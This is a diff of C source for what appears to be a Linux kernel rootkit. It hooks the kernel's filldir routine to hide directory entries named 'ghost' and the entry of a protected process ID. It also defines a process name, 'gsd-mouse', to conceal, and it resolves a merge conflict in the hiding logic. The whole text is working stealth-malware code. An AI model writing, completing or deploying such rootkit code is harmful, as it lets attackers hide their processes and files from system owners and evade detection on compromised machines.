@@ -26,7 +26,23 @@ int protected_pid = -1;
 int hide_pid = -1;
 const char *hide = "gsd-mouse";
 
+int adore_atoi(const char *str)
+{
+        int ret = 0, mul = 1;
+        const char *ptr;
+        for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++)
+                ;
+        ptr--;
+        while (ptr >= str) {
+                if (*ptr < '0' || *ptr > '9')
+                        break;
+                ret += (*ptr - '0') * mul;
+                mul *= 10;
+ptr--;   
+        }
 
+        return ret;
+}
 // int myatoi(char *str)
 // {
 // 　　int res = 0;
@@ -161,20 +177,13 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t of
 KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
-<<<<<<< HEAD
 
 	int ret = 0;
 	find_pid_kill();
-	
+	if(adore_atoi(name)==protected_pid){
+		return 0;
+	}
 	if (!strstr(name, "ghost"))
-=======
-	char *endp;
-	long pid;
-	int ret = 0;
-	find_pid_hide();
-	pid = simple_strtol(name, &endp, 10);
-	if (pid != hide_pid || !strstr(name, "ghost")|| !strstr(name,protected))
->>>>>>> 5a4c7337a618716d9e200265c1ff8877c0ee170a
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
